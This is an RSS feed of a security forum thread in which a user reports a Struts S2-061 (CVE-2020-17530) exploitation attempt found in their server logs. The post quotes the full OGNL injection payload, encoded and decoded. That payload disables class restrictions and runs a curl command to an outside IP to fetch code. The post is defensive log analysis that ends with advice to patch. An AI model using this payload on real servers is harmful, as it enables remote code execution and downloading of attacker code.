<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>The S2-061 Struts remote code execution vulnerability (CVE-2020-17530) in the WILD</title>
    <link>https://0x00sec.org/t/the-s2-061-struts-remote-code-execution-vulnerability-cve-2020-17530-in-the-wild/24324</link>
    <description>S2-061 Struts remote code execution vulnerability (CVE-2020-17530) on December 08, 2020 by apache and its marked &quot;difficult to weaponize&quot; by most sites i&#39;ve checked after finding this request. Today looking at my server logs I found a &#39;GET&#39; request with these:(I wont remove anything it might help a reseacher make sense of it)
&gt; `&quot;GET /?id=%25%7B%28%27Powered_by_Unicode_Potats0%2Cenjoy_it%27%29.%28%23UnicodeSec+%3D+%23application%5B%27org.apache.tomcat.InstanceManager%27%5D%29.%28%23potats0%3D%23UnicodeSec.newInstance%28%27org.apache.commons.collections.BeanMap%27%29%29.%28%23stackvalue%3D%23attr%5B%27struts.valueStack%27%5D%29.%28%23potats0.setBean%28%23stackvalue%29%29.%28%23context%3D%23potats0.get%28%27context%27%29%29.%28%23potats0.setBean%28%23context%29%29.%28%23sm%3D%23potats0.get%28%27memberAccess%27%29%29.%28%23emptySet%3D%23UnicodeSec.newInstance%28%27java.util.HashSet%27%29%29.%28%23potats0.setBean%28%23sm%29%29.%28%23potats0.put%28%27excludedClasses%27%2C%23emptySet%29%29.%28%23potats0.put%28%27excludedPackageNames%27%2C%23emptySet%29%29.%28%23exec%3D%23UnicodeSec.newInstance%28%27freemarker.template.utility.Execute%27%29%29.%28%23cmd%3D%7B%27curl+93.189.44.137%2Fssa%27%7D%29.%28%23res%3D%23exec.exec%28%23cmd%29%29%7D HTTP/1.0&quot;`

*Decoding the URL*

&gt; `{(&#39;Powered_by_Unicode_Potats0,enjoy_it&#39;).(#UnicodeSec = #application[&#39;org.apache.tomcat.InstanceManager&#39;]).(#potats0=#UnicodeSec.newInstance(&#39;org.apache.commons.collections.BeanMap&#39;)).(#stackvalue=#attr[&#39;struts.valueStack&#39;]).(#potats0.setBean(#stackvalue)).(#context=#potats0.get(&#39;context&#39;)).(#potats0.setBean(#context)).(#sm=#potats0.get(&#39;memberAccess&#39;)).(#emptySet=#UnicodeSec.newInstance(&#39;java.util.HashSet&#39;)).(#potats0.setBean(#sm)).(#potats0.put(&#39;excludedClasses&#39;,#emptySet)).(#potats0.put(&#39;excludedPackageNames&#39;,#emptySet)).(#exec=#UnicodeSec.newInstance(&#39;freemarker.template.utility.Execute&#39;)).(#cmd={&#39;curl 93.189.44.137/ssa&#39;}).(#res=#exec.exec(#cmd))}`

Decoding it and a little google search I found this chinese site that had described the POC with example of the real exploitation &quot;https://www.cnblogs.com/potatsoSec/p/14111163.html&quot;. With the site having the name &quot;potatso&quot; and the exploit having &quot;potats0&quot; is it a coincidence or is it a script-kiddie who just copied the code and tried just hitting anything online?? The IP 93[.]189[.]44[.]137 which curl calls is from Russia though. Researching on the exploit its marked &quot;difficult to weaponize&quot;. I still dont know if this is necessary  or it might help but Id say just patch  even if its marked with low risk.</description>
    
    <lastBuildDate>Tue, 22 Dec 2020 21:31:20 +0000</lastBuildDate>
    <category>Exploit Development</category>
    <atom:link href="https://0x00sec.org/t/the-s2-061-struts-remote-code-execution-vulnerability-cve-2020-17530-in-the-wild/24324.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>The S2-061 Struts remote code execution vulnerability (CVE-2020-17530) in the WILD</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/the-s2-061-struts-remote-code-execution-vulnerability-cve-2020-17530-in-the-wild/24324/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/the-s2-061-struts-remote-code-execution-vulnerability-cve-2020-17530-in-the-wild/24324/2</link>
        <pubDate>Fri, 23 Apr 2021 13:10:25 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-24324-2</guid>
        <source url="https://0x00sec.org/t/the-s2-061-struts-remote-code-execution-vulnerability-cve-2020-17530-in-the-wild/24324.rss">The S2-061 Struts remote code execution vulnerability (CVE-2020-17530) in the WILD</source>
      </item>
      <item>
        <title>The S2-061 Struts remote code execution vulnerability (CVE-2020-17530) in the WILD</title>
        <dc:creator><![CDATA[Ishma_Frcher5]]></dc:creator>
        <description><![CDATA[
            <p>S2-061 Struts remote code execution vulnerability (CVE-2020-17530) on December 08, 2020 by apache and its marked “difficult to weaponize” by most sites i’ve checked after finding this request. Today looking at my server logs I found a ‘GET’ request with these:(I wont remove anything it might help a reseacher make sense of it)</p>
<blockquote>
<p><code>"GET /?id=%25%7B%28%27Powered_by_Unicode_Potats0%2Cenjoy_it%27%29.%28%23UnicodeSec+%3D+%23application%5B%27org.apache.tomcat.InstanceManager%27%5D%29.%28%23potats0%3D%23UnicodeSec.newInstance%28%27org.apache.commons.collections.BeanMap%27%29%29.%28%23stackvalue%3D%23attr%5B%27struts.valueStack%27%5D%29.%28%23potats0.setBean%28%23stackvalue%29%29.%28%23context%3D%23potats0.get%28%27context%27%29%29.%28%23potats0.setBean%28%23context%29%29.%28%23sm%3D%23potats0.get%28%27memberAccess%27%29%29.%28%23emptySet%3D%23UnicodeSec.newInstance%28%27java.util.HashSet%27%29%29.%28%23potats0.setBean%28%23sm%29%29.%28%23potats0.put%28%27excludedClasses%27%2C%23emptySet%29%29.%28%23potats0.put%28%27excludedPackageNames%27%2C%23emptySet%29%29.%28%23exec%3D%23UnicodeSec.newInstance%28%27freemarker.template.utility.Execute%27%29%29.%28%23cmd%3D%7B%27curl+93.189.44.137%2Fssa%27%7D%29.%28%23res%3D%23exec.exec%28%23cmd%29%29%7D HTTP/1.0"</code></p>
</blockquote>
<p><em>Decoding the URL</em></p>
<blockquote>
<p><code>{('Powered_by_Unicode_Potats0,enjoy_it').(#UnicodeSec = #application['org.apache.tomcat.InstanceManager']).(#potats0=#UnicodeSec.newInstance('org.apache.commons.collections.BeanMap')).(#stackvalue=#attr['struts.valueStack']).(#potats0.setBean(#stackvalue)).(#context=#potats0.get('context')).(#potats0.setBean(#context)).(#sm=#potats0.get('memberAccess')).(#emptySet=#UnicodeSec.newInstance('java.util.HashSet')).(#potats0.setBean(#sm)).(#potats0.put('excludedClasses',#emptySet)).(#potats0.put('excludedPackageNames',#emptySet)).(#exec=#UnicodeSec.newInstance('freemarker.template.utility.Execute')).(#cmd={'curl 93.189.44.137/ssa'}).(#res=#exec.exec(#cmd))}</code></p>
</blockquote>
<p>Decoding it and a little google search I found this chinese site that had described the POC with example of the real exploitation “<a href="https://www.cnblogs.com/potatsoSec/p/14111163.html" rel="noopener nofollow ugc">https://www.cnblogs.com/potatsoSec/p/14111163.html</a>”. With the site having the name “potatso” and the exploit having “potats0” is it a coincidence or is it a script-kiddie who just copied the code and tried just hitting anything online?? The IP 93[.]189[.]44[.]137 which curl calls is from Russia though. Researching on the exploit its marked “difficult to weaponize”. I still dont know if this is necessary  or it might help but Id say just patch  even if its marked with low risk.</p>
          <p><a href="https://0x00sec.org/t/the-s2-061-struts-remote-code-execution-vulnerability-cve-2020-17530-in-the-wild/24324/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/the-s2-061-struts-remote-code-execution-vulnerability-cve-2020-17530-in-the-wild/24324/1</link>
        <pubDate>Tue, 22 Dec 2020 21:10:22 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-24324-1</guid>
        <source url="https://0x00sec.org/t/the-s2-061-struts-remote-code-execution-vulnerability-cve-2020-17530-in-the-wild/24324.rss">The S2-061 Struts remote code execution vulnerability (CVE-2020-17530) in the WILD</source>
      </item>
  </channel>
</rss>
